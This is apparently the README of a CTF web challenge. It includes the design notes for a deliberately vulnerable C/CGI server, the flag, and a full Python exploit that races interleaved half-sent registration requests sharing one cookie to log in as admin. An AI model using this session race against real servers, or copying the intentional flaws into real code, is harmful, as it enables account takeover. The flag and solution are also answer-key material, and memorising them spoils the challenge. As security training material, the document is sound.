# web1.0

Welcome to the web1.0.

## Public Challenge Description.

Welcome to the interweb!

We heared of this new thing called "the interweb" (or web for short) and promptly created a State-of-the-Art web server that allows you to store data _ON_ our server!
Say whaaaaaat!
Also, it leverages most modern web technologies to make this thing bullet proof.
Even I, the admin, use it to store my secrets.

## Secret Design Specification.

web1.0 is a web challenge that breaks the HTTP protocol a bit to facilitate a race condition.
It's written in C and players get the (obscure gcc89) source code.
With C preprocessor as templating language, etc.
As the service uses ASAN and FORTIFY_SOURCE, it does not provide an RCE, _even though_ it has a range of buffer overflows and even uses `gets` to read network input.

The service was originally designed for A/D, but works equally well as easy Jeopardy challenge.
It is based on a logic flaw/race condition.
As race conditions usually don't scale for A/D, this one can be exploited very slowly, as long as the attacker reuses the same Cookie for two logins.
For A/D, the bug would not be easy to see, as most traffic monitoring is per connection, and doesn't analyze interlaced connections.
The whole thing uses the python internal CGI server, I have no clue why it exists - but in comparison to other CGI servers, it doesn't read the complete request, but directly dups the body to the script's `stdin` after the header.
To drop the flag, the checker uses an `age` private key over a normal socket after the HTTP header was submitted.
The attacker also needs to understand and exploit this fact.

The hope here is that players learn about old-skool C, CGI, and logic flaws, even though their first instinct wants to PWN.
Oh and it supports modern web security mechanisms, such as CRSF tokens and CSP nonces, plus there is a range of fun red herings and memes in this.

## Full Solution Explanation.

In the checker folder, run
`./checker.py run exploit -a url -x 100000 | grep CTF`
a few times.

The flag for jeopardy mode is set to `FLAG=CTF{C-ing-1s-b3li3ving!}` in the [docker-compose.yml](./docker-compose.yml).

The exploit in [checker.py](./checker/checker.py):

- first registers an account to get the user list
- half-registers another user, but doesn't set the password - the serverthread will block in `readline`
- opens another socket, gets the csrf nonce to send half a POST with the same Cookie to register the admin user, doesn't set the password. This sets the username
- Finishes the first registration, this sets the logged-in state to 1.
- Reads the flag from the msg color.

```python
self.info("Step 1: get all available admin ids")
resp, cookie, csrf = self.register(self.random_user(), self.random_password())
admin_list = self.get_admin_list({COOKIE: cookie})
self.info(f"admins: {admin_list}")

found_flags = []
failed = []

for (admin_name, msg_id) in admin_list:
    try:
        self.info(
            f"Step 2: Start logging in as admin user with name {admin_name}"
        )
        resp, cookie, csrf = self.request_index()

        self.info("Step 3: Start registering a user - but without password")
        resp, cookie, csrf = self.request_index(cookies={COOKIE: cookie})

        self.debug(f"Cookie is {cookie}")

        sock_reg = self.connect(retries=8)

        http_reg = build_http(
            method="POST",
            query_params={"route": "register"},
            cookies={COOKIE: cookie},
            body_params={
                "username": f"ATTACKER{self.random_user()}",
                "csrf": csrf,
            },
        )

        # Write some dummy data to make sure our stuff got sent
        sock_reg.write(http_reg)
        time.sleep(0.007)
        sock_reg.write("\n\n\n\n\n")
        time.sleep(0.007)
        sock_reg.read_eager()

        self.info(
            "Step 4: Start registering the admin user (don't send the password) to set username"
        )

        sock_admin = self.connect(retries=8)
        resp, cookie, csrf = self.request_index(cookies={COOKIE: cookie})

        http_admin = build_http(
            method="POST",
            query_params={"route": "register"},
            cookies={COOKIE: cookie},
            body_params={"username": admin_name, "csrf": csrf},
        )
        sock_admin.write(http_admin)

        time.sleep(0.007)
        sock_admin.write("\n\n\n\n\n")
        time.sleep(0.007)
        sock_admin.read_eager()

        self.debug("step 5: finish register to set logged_in to 1")
        sock_reg.write(f"password={self.random_password()}\n")
        self.debug("Register complete. Should be logged in now.")
        self.debug(f"Register response: {sock_reg.read_until('</body>')}")
        sock_reg.close()
        self.info(
            "Now we should be logged in with the admin username. Get the msg!"
        )

        self.info(f"Final step - we are logged in as admin, read the flag.")
        get_flag = build_http(
            method="POST",
            query_params={"route": "msg", "token": msg_id},
            cookies={COOKIE: cookie},
        )
        sock_flag = self.connect(retries=8)
        sock_flag.write(get_flag)
        flag_response = ensure_unicode(sock_flag.read_until("</body>"))
        self.debug(f"Flag response: {flag_response}")

        flag_enc = flag_response.split('id="color">')[1].split("</code>")[0]
        flag = urllib.parse.unquote(html.unescape(flag_enc))
        self.warning(f"Found FLAG {flag}")
        found_flags.append(flag)

        sock_reg.close()
        sock_admin.close()
        sock_flag.close()
    except Exception as ex:
        self.error(
            f"Could not get flag with msg_id {msg_id} for user {admin_name}: {ex}"
        )
        failed.append(admin_name)

self.info(f"Got {len(found_flags)} flags and failed for {len(failed)}")
```
